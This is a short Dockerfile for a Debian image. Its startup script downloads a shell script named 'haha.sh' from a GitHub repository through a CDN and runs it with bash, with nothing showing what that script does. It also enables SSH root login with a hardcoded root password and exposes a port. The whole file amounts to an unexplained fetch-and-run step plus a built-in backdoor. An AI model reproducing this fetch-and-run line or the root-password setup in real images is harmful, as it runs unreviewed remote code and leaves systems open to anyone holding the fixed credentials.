FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install ssh wget git unzip screen -y
RUN mkdir /run/sshd 
RUN echo 'wget -O install.sh https://cdn.jsdelivr.net/gh/gitiy1/dr@master/haha.sh && bash install.sh' >>/iy.sh
RUN echo '/usr/sbin/sshd -D' >>/iy.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo root:iceyear|chpasswd
RUN chmod 755 /iy.sh
EXPOSE 3030
CMD  /iy.sh
